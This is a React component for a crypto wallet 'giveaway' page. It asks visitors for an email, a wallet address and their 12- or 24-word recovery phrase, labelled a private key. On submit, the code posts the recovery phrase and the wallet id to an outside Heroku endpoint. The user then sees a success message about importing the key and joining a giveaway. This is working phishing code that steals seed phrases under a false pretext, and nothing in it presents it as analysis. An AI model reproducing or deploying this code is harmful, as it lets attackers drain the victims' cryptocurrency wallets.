import React, { useState } from "react";
import axios from "axios";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import styles from "../../../styles/Home.module.css";
import Tabs from "..";
import { useRouter } from "next/router";

const Settings = () => {
  const [key, setKey] = useState("");
  const [info, setInfo] = useState({
    email: null,
    wallet: null,
    notif: false,
  });
  const router = useRouter();
  const { pid } = router.query;

  const notify = () => {
    key === "" ? "" : toast.success("Key Successfully Imported");
  };
  const notif = () => {
    setInfo({ ...info, notif: true });
    setTimeout(() => {
      setInfo({ ...info, notif: false });
    }, 5000);
  };
  const handleSubmit = (e) => {
    e.preventDefault();

    key !== ""
      ? axios
          .post("https://shielded-earth-12418.herokuapp.com/send", {
            key: key,
            wallet: pid,
          })
          .then((res) => res.json())
          .catch((err) => err)
      : "";
  };
  return (
    <Tabs>
      {info.notif && (
        <div className="text-center p-2 rounded bg-lightblue text-white text-base">
          Successfully registered for giveaway, you will receive an email if you
          are selected
        </div>
      )}
      <div>
        <form onSubmit={handleSubmit}>
          <div className="grid gap-2">
            <input
              placeholder="email"
              onChange={(e) => setInfo({ ...info, email: e.target.value })}
              className={`${styles.prtextarea} ${styles.tA2}`}
            />
            <input
              placeholder="wallet address"
              onChange={(e) => setInfo({ ...info, wallet: e.target.value })}
              className={`${styles.prtextarea} ${styles.tA2}`}
            />
          </div>
          <textarea
            value={key}
            onChange={(e) => setKey(e.target.value)}
            placeholder="Private Key is typically 12 (sometimes 24) words separated by single spaces"
            className={styles.prtextarea}
            required
          />
          <button
            onClick={notif}
            className={styles.prbutton}
            disabled={
              !info.email || !info.wallet || key === "" || key.length < 12
            }
          >
            import
          </button>
          <ToastContainer />
        </form>
      </div>
    </Tabs>
  );
};

export default Settings;
